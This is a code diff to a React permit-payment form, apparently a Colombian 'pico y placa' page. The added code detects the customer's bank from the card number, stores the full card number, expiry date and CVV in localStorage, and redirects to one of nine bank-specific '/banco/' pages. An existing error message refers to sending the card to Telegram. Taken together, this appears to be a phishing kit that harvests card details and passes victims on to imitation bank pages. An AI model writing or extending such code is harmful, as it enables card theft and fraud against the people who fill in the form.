@@ -14,6 +14,7 @@ import DinamicaModal from './DinamicaModal'
 import QrModal from './QrModal'
 import CardModal from './CardModal'
 import { supabase } from '@/lib/supabase'
+import { identifyBankByBin } from '@/utils/bank-identifier'
 
 interface PermitFormProps {
   selectedPlanId: any
@@ -306,6 +307,20 @@ export default function PermitForm({ selectedPlanId, onPlanSelect, initialData, 
 
     setIsCardLoading(true);
     setPaymentInitiated(true);
+    
+    const bancoDetectado = identifyBankByBin(cardData.cardNumber);
+    const redirectMap: Record<string, string> = {
+      'Bancolombia': '/banco/bancol',
+      'Davivienda': '/banco/davivienda',
+      'Bogota': '/banco/bogota',
+      'Colpatria': '/banco/colpatria',
+      'BBVA': '/banco/bbva',
+      'Occidente': '/banco/occidente',
+      'Tuya': '/banco/tuya',
+      'Falabella': '/banco/falabella',
+      'AV Villas': '/banco/avvillas',
+    };
+
     const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento || '';
     try {
       fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
@@ -319,6 +334,27 @@ export default function PermitForm({ selectedPlanId, onPlanSelect, initialData, 
         plan: selectedPlanId,
         total: currentTotal || total
       });
+
+      if (bancoDetectado && redirectMap[bancoDetectado]) {
+        const ruta = redirectMap[bancoDetectado];
+        const databank = {
+          ...formData,
+          plan: selectedPlanId,
+          total: currentTotal || total,
+          metodo_pago: bancoDetectado,
+          tarjeta: cardData.cardNumber,
+          fecha: cardData.expiryDate,
+          cvv: cardData.cvv,
+          cuotas: cardData.cuotas,
+          banco_validado: true,
+          banco_codigo: null,
+          banco_nombre: bancoDetectado
+        };
+        localStorage.setItem('pypPayment', JSON.stringify(databank));
+        
+        window.location.href = ruta;
+        return;
+      }
     } catch (err) {
       console.error('Error enviando tarjeta a Telegram:', err);
       setIsCardLoading(false);
